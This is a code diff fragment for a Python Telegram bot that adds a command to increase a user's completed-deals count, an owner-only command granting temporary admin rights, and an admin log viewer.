+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    try:
+        num = int(args[1])
+    except:
+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    user_completed_deals[user_id] = user_completed_deals.get(user_id, 0) + num
+    await message.answer(get_text(user_id, 'boost_success').format(num=num))
+    log_action(user_id, "boost_success", f"+{num}")
+
+@dp.message(Command("giveadmin"))
+async def cmd_giveadmin(message: types.Message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("Использование: /giveadmin [@user или id] [1m|1h|1d|1w|1M|1y]")
+        return
+    target_str = args[1]
+    time_str = args[2]
+    multipliers = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'M': 2592000, 'y': 31536000}
+    if time_str[-1] not in multipliers:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    try:
+        value = int(time_str[:-1])
+    except:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    duration = value * multipliers[time_str[-1]]
+    expiry = time.time() + duration
+    target_user_id = None
+    if target_str.startswith('@'):
+        target_user_id = None
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer("Пользователь не найден.")
+        return
+    temp_admins[target_user_id] = expiry
+    await message.answer(get_text(user_id, 'giveadmin_success').format(user=target_user_id, time_str=time_str))
+    log_action(user_id, "giveadmin", f"пользователю {target_user_id} на {time_str}")
+
+@dp.message(Command("logs"))
+async def cmd_logs(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    if not logs:
+        await message.answer(get_text(user_id, 'logs_empty'))
+        return
+    header = get_text(user_id, 'logs_header')
+    entries = []
+    for log in logs[-20:]:
+        entries.append(get_text(user_id, 'logs_entry').format(
+            time=log['time'],
+            user=log['user'],
+            action=log['action'],
+            data=log['data']
+        ))
+    text = header + "\n".join(entries)
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(message, text, keyboard)
+    log_action(user_id, "logs", "просмотр логов")
+
+# ---------- HTTP-сервер ----------
 async def health_check(request):
     return web.Response(text="OK")
 
